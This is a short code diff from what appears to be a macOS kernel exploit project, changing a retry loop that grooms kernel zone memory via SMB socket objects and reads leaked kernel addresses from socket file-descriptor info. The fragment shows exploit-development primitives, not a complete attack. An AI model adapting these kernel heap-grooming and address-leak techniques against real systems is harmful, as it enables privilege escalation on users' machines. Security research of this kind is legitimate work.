@@ -148,9 +148,13 @@ int kmem_zkext_alloc_small_try(const struct sockaddr_in* smb_addr, char* data, s
     for (int try = 0; try < MAX_TRIES; try++) {
 //        XE_LOG_INFO("try %d / %d", try, MAX_TRIES);
         kmem_zkext_neighbor_reader_prepare(reader, data_reader, sizeof(data_reader));
-        struct socket_fdinfo modified[8];
+        struct socket_fdinfo modified[1];
         size_t num_modified = XE_ARRAY_SIZE(modified);
         kmem_zkext_neighbor_reader_read_modified(reader, modified, &num_modified);
+        
+        if (num_modified != XE_ARRAY_SIZE(modified)) {
+            kmem_zkext_neighbor_reader_attempt_cleanup(reader);
+        }
         
         for (int i = 0; i < num_modified; i++) {
             uintptr_t* addr = (uintptr_t*)&modified[i].psi.soi_proto.pri_un.unsi_addr.ua_sun;
